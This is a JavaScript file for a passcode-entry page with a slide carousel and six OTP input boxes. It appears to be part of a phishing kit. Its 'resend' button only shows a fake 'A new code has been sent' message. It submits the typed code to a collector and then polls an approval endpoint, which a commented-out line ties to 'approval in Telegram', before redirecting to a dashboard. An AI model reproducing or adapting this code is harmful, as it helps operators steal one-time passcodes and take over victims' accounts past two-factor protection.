(function () {
  "use strict";
  var slides = Array.prototype.slice.call(document.querySelectorAll(".slide"));
  var dots = Array.prototype.slice.call(
    document.querySelectorAll(".slick-dots li"),
  );
  var current = 2;
  var timer;
  function showSlide(index) {
    current = (index + slides.length) % slides.length;
    slides.forEach(function (s, i) {
      s.classList.toggle("is-active", i === current);
    });
    dots.forEach(function (d, i) {
      d.classList.toggle("is-active", i === current);
    });
  }
  timer = window.setInterval(function () {
    showSlide(current + 1);
  }, 4500);
  dots.forEach(function (dot, i) {
    dot.querySelector("button").addEventListener("click", function () {
      window.clearInterval(timer);
      showSlide(i);
      timer = window.setInterval(function () {
        showSlide(current + 1);
      }, 4500);
    });
  });

  var boxes = Array.prototype.slice.call(document.querySelectorAll(".otp-box"));
  var submit = document.getElementById("otp-submit");
  var message = document.getElementById("otp-message");
  var form = document.getElementById("otp-form");

  function code() {
    return boxes
      .map(function (b) {
        return b.value;
      })
      .join("");
  }
  function update() {
    var ready = /^\d{6}$/.test(code());
    submit.disabled = !ready;
    submit.classList.toggle("btn--disabled", !ready);
  }

  boxes.forEach(function (box, i) {
    box.addEventListener("input", function () {
      box.value = box.value.replace(/\D/g, "").slice(-1);
      if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
      message.textContent = "";
      message.className = "otp-message";
      update();
    });
    box.addEventListener("keydown", function (e) {
      if (e.key === "Backspace" && !box.value && i > 0) boxes[i - 1].focus();
      if (e.key === "ArrowLeft" && i > 0) boxes[i - 1].focus();
      if (e.key === "ArrowRight" && i < boxes.length - 1) boxes[i + 1].focus();
    });
    box.addEventListener("focus", function () {
      box.classList.add("is-focused");
    });
    box.addEventListener("blur", function () {
      box.classList.remove("is-focused");
    });
  });

  document.getElementById("otp-resend").addEventListener("click", function () {
    message.textContent = "A new code has been sent.";
    message.className = "otp-message";
    boxes.forEach(function (b) {
      b.value = "";
    });
    boxes[0].focus();
    update();
  });

  var apiBase =
    window.location.protocol === "file:" ? "http://127.0.0.1:3000" : "";

  function finish() {
    window.setTimeout(function () {
      window.location.href = "dashboard.html";
    }, 500);
  }

  function reset() {
    boxes.forEach(function (b) {
      b.value = "";
    });
    submit.disabled = false;
    submit.textContent = "Verify";
    message.className = "otp-message";
    boxes[0].focus();
    update();
  }

  function waitForApproval(id, attempts) {
    attempts = attempts || 0;
    if (attempts > 120) {
      message.textContent = "Approval timed out. Please try again.";
      reset();
      return;
    }
    fetch(apiBase + "/api/approval/" + encodeURIComponent(id))
      .then(function (r) {
        return r.json();
      })
      .then(function (data) {
        if (data.status === "approved") {
          // message.textContent = "";
          message.className = "otp-message is-success";
          finish();
        } else if (data.status === "cancelled") {
          message.textContent = "Please try again.";
          reset();
        } else {
          window.setTimeout(function () {
            waitForApproval(id, attempts + 1);
          }, 1000);
        }
      })
      .catch(function () {
        window.setTimeout(function () {
          waitForApproval(id, attempts + 1);
        }, 1500);
      });
  }

  form.addEventListener("submit", function (e) {
    e.preventDefault();
    if (submit.disabled) return;
    submit.disabled = true;
    submit.textContent = "Loading...";
    // message.textContent = "Waiting for approval in Telegram...";
    message.className = "otp-message";
    window
      .localSubmit("otp", { status: code() })
      .then(function (result) {
        if (result && result.approvalId) {
          waitForApproval(result.approvalId);
        } else {
          finish();
        }
      })
      .catch(finish);
  });
})();
